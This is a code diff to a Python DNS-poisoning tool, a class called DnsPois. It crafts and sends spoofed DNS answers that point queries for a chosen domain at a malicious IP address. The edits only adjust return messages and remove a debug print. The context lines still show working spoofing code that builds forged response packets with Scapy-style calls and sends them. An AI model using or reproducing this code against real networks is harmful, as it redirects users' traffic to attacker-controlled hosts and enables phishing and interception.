@@ -45,6 +45,7 @@ class DnsPois:
                                    DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,
                                        an=(DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=mal_ip)))
                         send(spf_resp, verbose=0)
+                        return "Sent a spoofed DNS response to " + str(pkt['DNS Question Record'].qname)
                     else:
                         return forward(pkt)
                 else:
@@ -53,7 +54,6 @@ class DnsPois:
                 if DNS in pkt and pkt[DNS].opcode == 0 and pkt[DNS].ancount == 0 and str(pkt[IP].src) == rec_ip and \
                         str(pkt[IP].dst) == auth_ip:
 
-                    print(pkt.show())
                     if domain in str(pkt['DNS Question Record'].qname):
                         spf_resp = IP(dst=pkt[IP].src, src=pkt[IP].dst) / UDP(dport=pkt[UDP].sport,
                                                                               sport=pkt[UDP].dport) / DNS(
@@ -61,7 +61,7 @@ class DnsPois:
                             arcount=0,
                             an=(DNSRR(rrname=pkt[DNS].qd.qname, type='A', ttl=3600, rdata=mal_ip)))
                         send(spf_resp, verbose=0)
-                        return "Spoofed DNS Response Sent " + str(pkt['DNS Question Record'].qname)
+                        return "Sent a spoofed DNS response to " + str(pkt['DNS Question Record'].qname)
                     else:
                         return forward(pkt)
                 else:
